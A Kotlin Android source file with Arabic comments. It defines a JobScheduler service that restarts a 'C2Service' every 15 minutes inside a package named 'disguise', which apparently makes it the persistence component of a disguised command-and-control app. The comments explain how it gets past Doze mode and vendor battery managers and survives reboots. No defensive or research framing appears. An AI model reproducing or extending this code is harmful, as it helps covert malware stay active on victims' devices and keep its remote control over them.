package com.example.disguise.core

import android.app.job.JobParameters
import android.app.job.JobService
import android.util.Log

/**
 * RestartJobService — خدمة JobScheduler لإعادة تشغيل C2Service دورياً.
 *
 * المسؤولية:
 * - عند استدعاء JobScheduler (كل 15 دقيقة)، تتحقق من حالة C2Service
 *   وتحاول إعادة تشغيلها إذا لزم الأمر.
 *
 * لماذا JobScheduler وليس AlarmManager فقط؟
 * - AlarmManager قد يفشل على بعض الأجهزة (Doze mode, مديرو طاقة صينيون).
 * - JobScheduler أكثر موثوقية، ويعمل حتى في وضع Doze (مع setPersisted).
 * - يجمع بين إعادة التشغيل الدوري والاستمرارية بعد إعادة تشغيل الجهاز.
 *
 * ملاحظات:
 * - setPersisted(true) في C2Service.scheduleJobRestart() يتطلب
 *   RECEIVE_BOOT_COMPLETED (موجود في Manifest).
 * - JobService يعمل في الخيط الرئيسي، لذا لا نضع عمليات ثقيلة في onStartJob.
 * - نحن فقط نستدعي C2Service.start() (سريع) ثم jobFinished().
 * - JobService لا يعيد تشغيل نفسه تلقائياً إذا فشل؛ JobScheduler يعيد الجدولة
 *   بناءً على setPeriodic.
 *
 * ملاحظة: لا يمكن التحقق مباشرة من "هل C2Service تعمل؟" بدون ربط (bind).
 * بدء C2Service مرة أخرى آمن: onStartCommand تتحقق من pollingJob
 * ولا تبدأ polling مزدوجاً.
 */
class RestartJobService : JobService() {

    companion object {
        private const val TAG = "RestartJobService"
    }

    /**
     * يُستدعى عند تنفيذ المهمة.
     *
     * @param params معاملات المهمة (نستخدمها في jobFinished)
     * @return false = المهمة انتهت (لا حاجة لـ onStopJob)
     */
    override fun onStartJob(params: JobParameters?): Boolean {
        Log.d(TAG, "Job started, ensuring C2Service is running")

        try {
            // بدء C2Service (آمن حتى لو كانت تعمل)
            C2Service.start(applicationContext)
        } catch (e: Exception) {
            Log.e(TAG, "failed to start C2Service: ${e.message}", e)
        }

        // المهمة انتهت (لا عمل غير متزامن)
        jobFinished(params, false)
        return false
    }

    /**
     * يُستدعى إذا توقف النظام عن تنفيذ المهمة (مثلاً، لأسباب تتعلق بالبطارية).
     *
     * @return true = أعد جدولة المهمة (سنعيد المحاولة في الدورة التالية)
     */
    override fun onStopJob(params: JobParameters?): Boolean {
        Log.d(TAG, "Job stopped by system, will reschedule")
        return true // أعد الجدولة
    }
}